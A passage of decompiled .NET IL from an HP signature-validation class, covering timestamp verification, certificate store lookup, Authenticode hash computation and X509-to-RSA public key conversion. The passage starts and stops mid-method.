    IL_012d:  ldloc.s    certInStore
    IL_012f:  brtrue.s   IL_0139

    IL_0131:  ldloc.1
    IL_0132:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_0137:  ldc.i4.0
    IL_0138:  ret

    IL_0139:  ldloc.s    certInStore
    IL_013b:  ldloca.s   rsa
    IL_013d:  call       bool HPValidateSignature.SignedObjectAsn::ConvertX509PublicKey(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2,
                                                                                        valuetype [mscorlib]System.Security.Cryptography.RSAParameters&)
    IL_0142:  brtrue.s   IL_014c

    IL_0144:  ldloc.1
    IL_0145:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_014a:  ldc.i4.0
    IL_014b:  ret

    IL_014c:  nop
    .try
    {
      IL_014d:  ldloc.s    rsaManaged
      IL_014f:  ldloc.s    rsa
      IL_0151:  callvirt   instance void [mscorlib]System.Security.Cryptography.RSA::ImportParameters(valuetype [mscorlib]System.Security.Cryptography.RSAParameters)
      IL_0156:  leave.s    IL_0167

    }  // end .try
    catch [mscorlib]System.Security.Cryptography.CryptographicException 
    {
      IL_0158:  pop
      IL_0159:  ldloc.1
      IL_015a:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
      IL_015f:  ldc.i4.0
      IL_0160:  stloc.s    V_7
      IL_0162:  leave      IL_02d8

    }  // end handler
    IL_0167:  ldarg.0
    IL_0168:  ldarg.0
    IL_0169:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_016e:  ldloc.s    certInStore
    IL_0170:  callvirt   instance native int [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::get_Handle()
    IL_0175:  ldc.i4.0
    IL_0176:  call       instance uint32 HPValidateSignature.SignedObjectAsn::VerifyCertChain(native int,
                                                                                              native int,
                                                                                              bool)
    IL_017b:  stloc.s    V_8
    IL_017d:  ldloc.s    V_8
    IL_017f:  ldc.i4.1
    IL_0180:  bgt.un     IL_02d0

    IL_0185:  ldarg.0
    IL_0186:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_018b:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeSignatureLen()
    IL_0190:  conv.ovf.i
    IL_0191:  newarr     [mscorlib]System.Byte
    IL_0196:  stloc.s    numArray3
    IL_0198:  ldarg.1
    IL_0199:  ldarg.0
    IL_019a:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_019f:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeSignature()
    IL_01a4:  conv.i4
    IL_01a5:  ldloc.s    numArray3
    IL_01a7:  ldc.i4.0
    IL_01a8:  ldloc.s    numArray3
    IL_01aa:  ldlen
    IL_01ab:  conv.i4
    IL_01ac:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_01b1:  ldarg.0
    IL_01b2:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_01b7:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeAuthAttributesLen()
    IL_01bc:  conv.ovf.i
    IL_01bd:  newarr     [mscorlib]System.Byte
    IL_01c2:  stloc.s    buffer
    IL_01c4:  ldarg.1
    IL_01c5:  ldarg.0
    IL_01c6:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_01cb:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeAuthAttributes()
    IL_01d0:  conv.i4
    IL_01d1:  ldloc.s    buffer
    IL_01d3:  ldc.i4.0
    IL_01d4:  ldloc.s    buffer
    IL_01d6:  ldlen
    IL_01d7:  conv.i4
    IL_01d8:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_01dd:  ldloc.s    buffer
    IL_01df:  ldc.i4.0
    IL_01e0:  ldc.i4.s   49
    IL_01e2:  stelem.i1
    IL_01e3:  ldloc.1
    IL_01e4:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Initialize()
    IL_01e9:  ldloc.1
    IL_01ea:  ldloc.s    buffer
    IL_01ec:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_01f1:  pop
    IL_01f2:  ldloc.s    rsaManaged
    IL_01f4:  ldloc.1
    IL_01f5:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::get_Hash()
    IL_01fa:  ldstr      "MD5SHA1"
    IL_01ff:  call       string [mscorlib]System.Security.Cryptography.CryptoConfig::MapNameToOID(string)
    IL_0204:  ldloc.s    numArray3
    IL_0206:  callvirt   instance bool [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider::VerifyHash(uint8[],
                                                                                                                   string,
                                                                                                                   uint8[])
    IL_020b:  brtrue.s   IL_0215

    IL_020d:  ldloc.1
    IL_020e:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_0213:  ldc.i4.0
    IL_0214:  ret

    IL_0215:  ldloc.1
    IL_0216:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_021b:  ldarg.2
    IL_021c:  brfalse    IL_02ce

    IL_0221:  ldarg.0
    IL_0222:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0227:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_UtcTimeLen()
    IL_022c:  ldc.i4.1
    IL_022d:  conv.i8
    IL_022e:  sub
    IL_022f:  conv.ovf.i
    IL_0230:  newarr     [mscorlib]System.Byte
    IL_0235:  stloc.s    numArray4
    IL_0237:  ldarg.1
    IL_0238:  ldarg.0
    IL_0239:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_023e:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_UtcTime()
    IL_0243:  conv.i4
    IL_0244:  ldloc.s    numArray4
    IL_0246:  ldc.i4.0
    IL_0247:  ldloc.s    numArray4
    IL_0249:  ldlen
    IL_024a:  conv.i4
    IL_024b:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_0250:  ldloca.s   dateTime
    IL_0252:  ldloc.s    numArray4
    IL_0254:  ldc.i4.0
    IL_0255:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_025a:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_025f:  ldc.i4     0x7d0
    IL_0264:  add
    IL_0265:  ldloc.s    numArray4
    IL_0267:  ldc.i4.2
    IL_0268:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_026d:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_0272:  ldloc.s    numArray4
    IL_0274:  ldc.i4.4
    IL_0275:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_027a:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_027f:  ldloc.s    numArray4
    IL_0281:  ldc.i4.6
    IL_0282:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_0287:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_028c:  ldloc.s    numArray4
    IL_028e:  ldc.i4.8
    IL_028f:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_0294:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_0299:  ldloc.s    numArray4
    IL_029b:  ldc.i4.s   10
    IL_029d:  call       int16 [mscorlib]System.BitConverter::ToInt16(uint8[],
                                                                      int32)
    IL_02a2:  call       int16 HPValidateSignature.SignedObjectAsn::CharsToInt(int16)
    IL_02a7:  call       instance void [mscorlib]System.DateTime::.ctor(int32,
                                                                        int32,
                                                                        int32,
                                                                        int32,
                                                                        int32,
                                                                        int32)
    IL_02ac:  ldarg.0
    IL_02ad:  ldflda     valuetype [mscorlib]System.DateTime HPValidateSignature.SignedObjectAsn::notAfter
    IL_02b2:  ldloc.s    dateTime
    IL_02b4:  call       instance int32 [mscorlib]System.DateTime::CompareTo(valuetype [mscorlib]System.DateTime)
    IL_02b9:  ldc.i4.0
    IL_02ba:  bge.s      IL_02ce

    IL_02bc:  ldarg.0
    IL_02bd:  ldflda     valuetype [mscorlib]System.DateTime HPValidateSignature.SignedObjectAsn::notBefore
    IL_02c2:  ldloc.s    dateTime
    IL_02c4:  call       instance int32 [mscorlib]System.DateTime::CompareTo(valuetype [mscorlib]System.DateTime)
    IL_02c9:  ldc.i4.0
    IL_02ca:  ble.s      IL_02ce

    IL_02cc:  ldc.i4.0
    IL_02cd:  ret

    IL_02ce:  ldc.i4.1
    IL_02cf:  ret

    IL_02d0:  ldloc.1
    IL_02d1:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_02d6:  ldc.i4.0
    IL_02d7:  ret

    IL_02d8:  ldloc.s    V_7
    IL_02da:  ret
  } // end of method SignedObjectAsn::VerifyTimeStamp

  .method private hidebysig static int16 
          CharsToInt(int16 'value') cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  3
    .locals init ([0] int16 num2)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4     0xff00
    IL_0006:  and
    IL_0007:  ldc.i4.8
    IL_0008:  shr
    IL_0009:  conv.i2
    IL_000a:  ldarg.0
    IL_000b:  ldc.i4.s   15
    IL_000d:  and
    IL_000e:  ldc.i4.s   10
    IL_0010:  mul
    IL_0011:  conv.i2
    IL_0012:  starg.s    'value'
    IL_0014:  ldc.i4.s   15
    IL_0016:  and
    IL_0017:  conv.i2
    IL_0018:  stloc.0
    IL_0019:  ldarg.0
    IL_001a:  ldloc.0
    IL_001b:  add
    IL_001c:  conv.i2
    IL_001d:  ret
  } // end of method SignedObjectAsn::CharsToInt

  .method private hidebysig instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 
          FindCertInStore(string serialNum) cil managed
  {
    // Code size       157 (0x9d)
    .maxstack  3
    .locals init ([0] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 x509Certificate2,
             [1] native int num,
             [2] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Enumerator V_2,
             [3] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 cert)
    IL_0000:  ldnull
    IL_0001:  stloc.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
    IL_0008:  callvirt   instance int32 [mscorlib]System.Collections.CollectionBase::get_Count()
    IL_000d:  brtrue.s   IL_006b

    IL_000f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0014:  stloc.1
    .try
    {
      IL_0015:  ldarg.0
      IL_0016:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
      IL_001b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0020:  call       native int HPValidateSignature.NativeMethods::CertEnumCertificatesInStore(native int,
                                                                                                     native int)
      IL_0025:  stloc.1
      IL_0026:  br.s       IL_0047

      IL_0028:  ldarg.0
      IL_0029:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
      IL_002e:  ldloc.1
      IL_002f:  newobj     instance void [System]System.Security.Cryptography.X509Certificates.X509Certificate2::.ctor(native int)
      IL_0034:  callvirt   instance int32 [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection::Add(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2)
      IL_0039:  pop
      IL_003a:  ldarg.0
      IL_003b:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
      IL_0040:  ldloc.1
      IL_0041:  call       native int HPValidateSignature.NativeMethods::CertEnumCertificatesInStore(native int,
                                                                                                     native int)
      IL_0046:  stloc.1
      IL_0047:  ldloc.1
      IL_0048:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_004d:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                       native int)
      IL_0052:  brtrue.s   IL_0028

      IL_0054:  leave.s    IL_006b

    }  // end .try
    finally
    {
      IL_0056:  ldloc.1
      IL_0057:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_005c:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                       native int)
      IL_0061:  brfalse.s  IL_006a

      IL_0063:  ldloc.1
      IL_0064:  call       bool HPValidateSignature.NativeMethods::CertFreeCertificateContext(native int)
      IL_0069:  pop
      IL_006a:  endfinally
    }  // end handler
    IL_006b:  ldarg.0
    IL_006c:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection HPValidateSignature.SignedObjectAsn::certCollection
    IL_0071:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2Enumerator [System]System.Security.Cryptography.X509Certificates.X509Certificate2Collection::GetEnumerator()
    IL_0076:  stloc.2
    IL_0077:  br.s       IL_0093

    IL_0079:  ldloc.2
    IL_007a:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 [System]System.Security.Cryptography.X509Certificates.X509Certificate2Enumerator::get_Current()
    IL_007f:  stloc.3
    IL_0080:  ldloc.3
    IL_0081:  callvirt   instance string [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::GetSerialNumberString()
    IL_0086:  ldarg.1
    IL_0087:  ldc.i4.4
    IL_0088:  call       int32 [mscorlib]System.String::Compare(string,
                                                                string,
                                                                valuetype [mscorlib]System.StringComparison)
    IL_008d:  brtrue.s   IL_0093

    IL_008f:  ldloc.3
    IL_0090:  stloc.0
    IL_0091:  br.s       IL_009b

    IL_0093:  ldloc.2
    IL_0094:  callvirt   instance bool [System]System.Security.Cryptography.X509Certificates.X509Certificate2Enumerator::MoveNext()
    IL_0099:  brtrue.s   IL_0079

    IL_009b:  ldloc.0
    IL_009c:  ret
  } // end of method SignedObjectAsn::FindCertInStore

  .method private hidebysig static string 
          CreateHexString(uint8[] obj,
                          int64 index,
                          int64 len) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  8
    .locals init ([0] class [mscorlib]System.Text.StringBuilder stringBuilder,
             [1] int32 index1)
    IL_0000:  ldarg.0
    IL_0001:  brtrue.s   IL_0009

    IL_0003:  ldstr      ""
    IL_0008:  ret

    IL_0009:  ldarg.2
    IL_000a:  conv.i4
    IL_000b:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0010:  stloc.0
    IL_0011:  ldc.i4.0
    IL_0012:  stloc.1
    IL_0013:  br.s       IL_003a

    IL_0015:  ldloc.0
    IL_0016:  ldstr      "{0:X2}"
    IL_001b:  ldc.i4.1
    IL_001c:  newarr     [mscorlib]System.Object
    IL_0021:  dup
    IL_0022:  ldc.i4.0
    IL_0023:  ldarg.0
    IL_0024:  ldarg.1
    IL_0025:  ldloc.1
    IL_0026:  conv.i8
    IL_0027:  add
    IL_0028:  conv.ovf.i
    IL_0029:  ldelem.u1
    IL_002a:  box        [mscorlib]System.Byte
    IL_002f:  stelem.ref
    IL_0030:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendFormat(string,
                                                                                                                              object[])
    IL_0035:  pop
    IL_0036:  ldloc.1
    IL_0037:  ldc.i4.1
    IL_0038:  add
    IL_0039:  stloc.1
    IL_003a:  ldloc.1
    IL_003b:  conv.i8
    IL_003c:  ldarg.2
    IL_003d:  blt.s      IL_0015

    IL_003f:  ldloc.0
    IL_0040:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0045:  ret
  } // end of method SignedObjectAsn::CreateHexString

  .method private hidebysig instance uint8[] 
          ComputeAuthenticodeSigHash(uint8[] buffer,
                                     class [mscorlib]System.Security.Cryptography.HashAlgorithm hash) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  6
    .locals init ([0] uint8[] buffer1,
             [1] uint8[] buffer2)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0006:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentInfo()
    IL_000b:  brtrue.s   IL_0022

    IL_000d:  ldstr      "Invalid Buffer:  Couldn't find ContentInfo"
    IL_0012:  newobj     instance void [mscorlib]System.ArgumentException::.ctor(string)
    IL_0017:  ldc.i4     0xc002ec
    IL_001c:  call       void [HP.Platform.Framework]HP.Common.System.Diagnostics.SysTrace::_WriteEvent(uint32)
    IL_0021:  throw

    IL_0022:  ldarg.0
    IL_0023:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0028:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_AuthAttributes()
    IL_002d:  brtrue.s   IL_006e

    IL_002f:  ldarg.2
    IL_0030:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Initialize()
    IL_0035:  ldarg.2
    IL_0036:  ldarg.1
    IL_0037:  ldarg.0
    IL_0038:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_003d:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentData()
    IL_0042:  conv.i4
    IL_0043:  ldarg.0
    IL_0044:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0049:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentLen()
    IL_004e:  conv.i4
    IL_004f:  ldarg.1
    IL_0050:  ldarg.0
    IL_0051:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0056:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentData()
    IL_005b:  conv.i4
    IL_005c:  callvirt   instance int32 [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformBlock(uint8[],
                                                                                                             int32,
                                                                                                             int32,
                                                                                                             uint8[],
                                                                                                             int32)
    IL_0061:  pop
    IL_0062:  ldarg.2
    IL_0063:  ldarg.1
    IL_0064:  ldc.i4.0
    IL_0065:  ldc.i4.0
    IL_0066:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformFinalBlock(uint8[],
                                                                                                                    int32,
                                                                                                                    int32)
    IL_006b:  pop
    IL_006c:  br.s       IL_00e1

    IL_006e:  ldarg.0
    IL_006f:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0074:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_AuthAttributesLen()
    IL_0079:  conv.ovf.i
    IL_007a:  newarr     [mscorlib]System.Byte
    IL_007f:  stloc.0
    IL_0080:  ldarg.1
    IL_0081:  ldarg.0
    IL_0082:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0087:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_AuthAttributes()
    IL_008c:  conv.i4
    IL_008d:  ldloc.0
    IL_008e:  ldc.i4.0
    IL_008f:  ldloc.0
    IL_0090:  ldlen
    IL_0091:  conv.i4
    IL_0092:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_0097:  ldloc.0
    IL_0098:  ldc.i4.0
    IL_0099:  ldc.i4.s   49
    IL_009b:  stelem.i1
    IL_009c:  ldarg.0
    IL_009d:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00a2:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentLen()
    IL_00a7:  conv.ovf.i
    IL_00a8:  newarr     [mscorlib]System.Byte
    IL_00ad:  stloc.1
    IL_00ae:  ldarg.1
    IL_00af:  ldarg.0
    IL_00b0:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00b5:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_ContentData()
    IL_00ba:  conv.i4
    IL_00bb:  ldloc.1
    IL_00bc:  ldc.i4.0
    IL_00bd:  ldloc.1
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_00c5:  ldarg.2
    IL_00c6:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Initialize()
    IL_00cb:  ldarg.2
    IL_00cc:  ldloc.1
    IL_00cd:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_00d2:  pop
    IL_00d3:  ldarg.2
    IL_00d4:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Initialize()
    IL_00d9:  ldarg.2
    IL_00da:  ldloc.0
    IL_00db:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_00e0:  pop
    IL_00e1:  ldarg.2
    IL_00e2:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::get_Hash()
    IL_00e7:  ret
  } // end of method SignedObjectAsn::ComputeAuthenticodeSigHash

  .method private hidebysig static bool  ConvertX509PublicKey(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 x509Cert,
                                                              valuetype [mscorlib]System.Security.Cryptography.RSAParameters& rsa) cil managed
  {
    // Code size       243 (0xf3)
    .maxstack  8
    .locals init ([0] uint8[] publicKey,
             [1] uint32 pcbStructInfo,
             [2] native int num1,
             [3] uint8[] numArray1,
             [4] native int V_4,
             [5] int32 num2,
             [6] uint8[] bytes,
             [7] int32 length,
             [8] uint8[] numArray2,
             [9] valuetype HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER V_9,
             [10] bool V_10)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::GetPublicKey()
    IL_0006:  stloc.0
    IL_0007:  ldc.i4.0
    IL_0008:  stloc.1
    IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_000e:  stloc.2
    IL_000f:  ldc.i4.1
    IL_0010:  ldc.i4.s   19
    IL_0012:  ldloc.0
    IL_0013:  ldloc.0
    IL_0014:  ldlen
    IL_0015:  conv.i4
    IL_0016:  ldc.i4.0
    IL_0017:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_001c:  ldnull
    IL_001d:  ldloca.s   pcbStructInfo
    IL_001f:  call       bool HPValidateSignature.NativeMethods::CryptDecodeObjectEx(uint32,
                                                                                     uint32,
                                                                                     uint8[],
                                                                                     uint32,
                                                                                     uint32,
                                                                                     native int,
                                                                                     uint8[],
                                                                                     uint32&)
    IL_0024:  brtrue.s   IL_0028

    IL_0026:  ldc.i4.0
    IL_0027:  ret

    IL_0028:  ldloc.1
    IL_0029:  conv.u8
    IL_002a:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_002f:  stloc.s    V_4
    IL_0031:  ldloca.s   V_4
    IL_0033:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
    IL_0038:  newarr     [mscorlib]System.Byte
    IL_003d:  stloc.3
    IL_003e:  ldc.i4.1
    IL_003f:  ldc.i4.s   19
    IL_0041:  ldloc.0
    IL_0042:  ldloc.0
    IL_0043:  ldlen
    IL_0044:  conv.i4
    IL_0045:  ldc.i4.0
    IL_0046:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_004b:  ldloc.3
    IL_004c:  ldloca.s   pcbStructInfo
    IL_004e:  call       bool HPValidateSignature.NativeMethods::CryptDecodeObjectEx(uint32,
                                                                                     uint32,
                                                                                     uint8[],
                                                                                     uint32,
                                                                                     uint32,
                                                                                     native int,
                                                                                     uint8[],
                                                                                     uint32&)
    IL_0053:  brtrue.s   IL_0057

    IL_0055:  ldc.i4.0
    IL_0056:  ret

    IL_0057:  nop
    .try
    {
      .try
      {
        IL_0058:  ldloca.s   V_9
        IL_005a:  initobj    HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER
        IL_0060:  ldloc.s    V_9
        IL_0062:  box        HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER
        IL_0067:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(object)
        IL_006c:  stloc.s    num2
        IL_006e:  ldloc.s    num2
        IL_0070:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::AllocCoTaskMem(int32)
        IL_0075:  stloc.2
        IL_0076:  ldloc.3
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  ldloc.s    num2
        IL_007b:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::Copy(uint8[],
                                                                                         int32,
                                                                                         native int,
                                                                                         int32)
        IL_0080:  ldloc.2
        IL_0081:  ldtoken    HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER
        IL_0086:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
        IL_008b:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                     class [mscorlib]System.Type)
        IL_0090:  unbox.any  HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER
        IL_0095:  dup
        IL_0096:  ldfld      uint32 HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER::pubexp
        IL_009b:  call       uint8[] [mscorlib]System.BitConverter::GetBytes(uint32)
        IL_00a0:  stloc.s    bytes
        IL_00a2:  ldloc.s    bytes
        IL_00a4:  call       void [mscorlib]System.Array::Reverse(class [mscorlib]System.Array)
        IL_00a9:  ldfld      uint32 HPValidateSignature.NativeMethods/PUBKEYBLOBHEADER::bitlen
        IL_00ae:  ldc.i4.8
        IL_00af:  div
        IL_00b0:  stloc.s    length
        IL_00b2:  ldloc.s    length
        IL_00b4:  newarr     [mscorlib]System.Byte
        IL_00b9:  stloc.s    numArray2
        IL_00bb:  ldloc.3
        IL_00bc:  ldloc.s    num2
        IL_00be:  ldloc.s    numArray2
        IL_00c0:  ldc.i4.0
        IL_00c1:  ldloc.s    length
        IL_00c3:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                               int32,
                                                               class [mscorlib]System.Array,
                                                               int32,
                                                               int32)
        IL_00c8:  ldloc.s    numArray2
        IL_00ca:  call       void [mscorlib]System.Array::Reverse(class [mscorlib]System.Array)
        IL_00cf:  ldarg.1
        IL_00d0:  ldloc.s    bytes
        IL_00d2:  stfld      uint8[] [mscorlib]System.Security.Cryptography.RSAParameters::Exponent
        IL_00d7:  ldarg.1
        IL_00d8:  ldloc.s    numArray2
        IL_00da:  stfld      uint8[] [mscorlib]System.Security.Cryptography.RSAParameters::Modulus
        IL_00df:  leave.s    IL_00ee

      }  // end .try
      catch [mscorlib]System.ArgumentException 
      {
        IL_00e1:  pop
        IL_00e2:  ldc.i4.0
        IL_00e3:  stloc.s    V_10
        IL_00e5:  leave.s    IL_00f0

      }  // end handler
    }  // end .try
    finally
    {
      IL_00e7:  ldloc.2
      IL_00e8:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
      IL_00ed:  endfinally
    }  // end handler
    IL_00ee:  ldc.i4.1
    IL_00ef:  ret

    IL_00f0:  ldloc.s    V_10
    IL_00f2:  ret
  } // end of method SignedObjectAsn::ConvertX509PublicKey

  .method private hidebysig instance uint32 
          VerifyCertChain(native int store,
                          native int cert,
                          bool saveValidityTime) cil managed
  {
    // Code size       135 (0x87)
    .maxstack  4
    .locals init ([0] valuetype HPValidateSignature.NativeMethods/CERT_INFO structure)
    IL_0000:  ldc.i4.1
    IL_0001:  ldarg.0
    IL_0002:  ldfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_0007:  ldtoken    HPValidateSignature.NativeMethods/CERT_CONTEXT
    IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0011:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                 class [mscorlib]System.Type)
    IL_0016:  unbox      HPValidateSignature.NativeMethods/CERT_CONTEXT
    IL_001b:  ldfld      native int HPValidateSignature.NativeMethods/CERT_CONTEXT::pCertInfo
